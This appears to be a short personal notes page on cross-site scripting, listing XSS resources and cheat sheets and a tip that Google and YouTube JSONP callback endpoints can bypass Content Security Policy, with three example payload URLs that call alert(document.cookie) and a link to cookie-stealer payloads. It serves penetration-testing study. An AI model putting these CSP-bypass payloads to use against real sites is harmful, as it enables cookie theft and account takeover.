---
sticker: emoji//1f5d2-fe0f
---
### Resources:
- [Exploiting XSS in 2020](https://netsec.expert/posts/xss-in-2020/) - what still works, bypasses, and why!
- [Actually Good XSS Payloads, & explanations/wiki](https://github.com/payload-box/xss-payload-list)
- [Hackviser - XSS](https://hackviser.com/tactics/pentesting/web/xss)
- [Hacktricks - XSS](https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)

**Using the Google API** - will just reflect JavaScript onto the page, can use this to bypass CSP.

```
https://www.youtube.com/oembed?callback=alert(document.cookie)

https://www.googleapis.com/customsearch/v1?callback=alert(document.cookie)

curl "https://maps.googleapis.com/maps/api/js?callback=alert(document.cookie)"
```

![](attachments/Pasted%20image%2020260514142946.png)
### Cheat Sheets:
- [Master XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) (portswigger)
- [Filter evasion cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md)